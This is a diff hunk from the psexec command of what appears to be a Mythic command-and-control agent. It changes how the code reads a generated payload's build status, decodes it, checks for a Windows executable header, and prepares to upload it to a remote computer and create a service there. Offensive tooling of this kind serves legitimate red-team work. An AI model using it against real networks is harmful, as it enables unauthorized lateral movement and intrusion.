@@ -60,21 +60,23 @@ class PsExecCommand(CommandBase):
             while True:
                 resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"])
                 if resp.status == MythicStatus.Success:
-                    if resp.build_phase == 'success':
-                        if len(resp.contents) > 1 and resp.contents[:2] != b"\x4d\x5a":
+                    if resp.response["build_phase"] == 'success':
+                        b64contents = resp.response["contents"]
+                        pe = base64.b64decode(b64contents)
+                        if len(pe) > 1 and pe[:2] != b"\x4d\x5a":
                             raise Exception("psexec requires a payload executable, but got unknown type.")
                         # it's done, so we can register a file for it
                         task.args.add_arg("template", resp.response["file"]["agent_file_id"])
                         task.display_params = "Uploading payload '{}' to {} on {} and creating service '{}'".format(temp.response['tag'], task.args.get_arg("remote_path"), task.args.get_arg("computer"), task.args.get_arg("service_name"))
                         break
-                    elif resp.build_phase == 'error':
-                        raise Exception("Failed to build new payload: {}".format(resp.error_message))
-                    elif resp.build_phase == "building":
+                    elif resp.response["build_phase"] == 'error':
+                        raise Exception("Failed to build new payload: {}".format(resp.response["error_message"]))
+                    elif resp.response["build_phase"] == "building":
                         await asyncio.sleep(2)
                     else:
-                        raise Exception(resp.build_phase)
+                        raise Exception(resp.response["build_phase"])
                 else:
-                    raise Exception(resp.error_message)
+                    raise Exception(resp.response["error_message"])
         else:
             raise Exception("Failed to start build process")
 
